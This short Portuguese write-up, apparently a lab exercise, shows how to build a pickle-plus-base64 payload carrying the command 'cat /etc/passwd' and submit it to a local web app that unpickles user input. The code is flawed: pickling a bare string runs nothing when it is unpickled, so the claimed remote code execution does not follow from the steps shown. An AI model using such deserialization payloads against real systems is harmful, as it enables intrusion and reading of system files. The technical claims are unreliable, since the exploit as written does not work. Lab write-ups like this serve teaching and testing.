# Para explorar a vulnerabilidade RCE - Execução de Código Remoto *(Remote Code Execution)*

Como payload para exploração da vulnerabilidade, foi utilizado as bibliotecas pickle e base64 na linguagem Python.

## Etapas para geração de payload

### Importe as bibliotecas "pickle" e "base64"

```python
import pickle
import base64
```
### Insira o camando a ser executado no servidor

```python
cmd = 'cat /etc/passwd'
print('Comando a ser usado...: ', cmd)
```

### Utilize a biblioteca pickle para serializar a string do comando do passo anterior

```python
payload_pickle = pickle.dumps(cmd)
print('Pickle do comando.....: ', payload_pickle)
```

### Codifique o resultado do pickle em base64 utilizando da biblioteca base64

```python
payload_base64=base64.b64encode(payload_pickle)
print('Base64 do Pickle......: ', payload_base64)
```

## Testando na aplicação

Acesse a aplicação pelo link http://localhost:5000

Copie a saida do passo que gerou o Base64 e cole no campo **Enter Serialized Data:** e clique no botão **Submit**.


## Como foi descoberto a vulnerabilidade

Utilizei de engenharia reversa observei que o campo da request era primeiro decodificado pelo método **urlsafe_b64decode** da biblioteca **base64** *(Python)* e em seguida deserializado pelo método **loads** da biblioteca **pickle**.

Logo, na geração do payload primeiro foi gerado o pickle e depois o base64.

